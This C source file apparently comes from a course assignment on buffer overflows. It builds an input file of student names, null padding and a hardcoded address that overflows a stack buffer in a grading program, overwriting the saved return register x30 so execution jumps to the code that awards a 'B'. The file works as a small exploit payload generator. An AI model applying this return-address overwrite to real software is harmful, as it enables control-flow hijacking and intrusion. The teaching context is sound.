/*----------------------------------------------------------------------
createdataB.c
Produces a file called dataB with the student name, a nullbyte, padding
to overrun the stack, and the address of the instruction in main to get
a B, the latter of which will overwrite getName's stored x30.
----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Take no argument. Writes in a file named dataB and returns 0. */
int main(void)
{
    FILE *psFile;
    const char *name = "Ryo Mitsuhashi, Seungho Lee";
    const int nameLength = (int)strlen(name);
    int i;
    /* The distance between buffer array to getName's x30 */
    int distance = 88 - 40;
    /* Address of grade = 'B'; instruction */
    const unsigned long address = 0x400890;

    psFile = fopen("dataB", "w");
    /* Write names */
    fprintf(psFile, "%s", name);
    /* Write null bytes until reaching the getName's x30 */
    distance -= nameLength;
    for (i = 0; i < distance; i++)
        fprintf(psFile, "%c", 0x00);
    /* Overwrite x30 address */
    (void)fwrite(&address, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
